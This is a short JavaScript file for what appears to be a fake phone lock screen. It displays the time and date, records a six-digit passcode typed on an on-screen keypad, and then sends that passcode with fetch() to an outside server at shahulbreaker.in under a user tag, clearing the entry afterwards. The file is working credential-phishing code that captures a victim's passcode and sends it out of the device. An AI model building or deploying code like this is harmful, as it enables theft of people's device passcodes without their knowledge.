const timeEl = document.getElementById('time');
const dateEl = document.getElementById('date');
const dots = document.querySelectorAll('.dots span');
let passcode = '';

function updateTime() {
    const now = new Date();
    timeEl.textContent = now.toLocaleTimeString([], {hour: '2-digit', minute: '2-digit'});
    dateEl.textContent = now.toLocaleDateString([], {weekday: 'long', month: 'long', day: 'numeric'});
}
setInterval(updateTime, 1000);
updateTime();

document.querySelectorAll('.keypad button').forEach(btn => {
    btn.addEventListener('click', () => {
        if (passcode.length < 6) {
            passcode += btn.dataset.num;
            dots[passcode.length - 1].style.background = 'white';
        }
        if (passcode.length === 6) {
            fetch(`https://shahulbreaker.in/api/storedata.php?user=tarunpeek&data=${passcode}`)
            .then(() => {
                passcode = '';
                dots.forEach(dot => dot.style.background = 'transparent');
            });
        }
    });
});
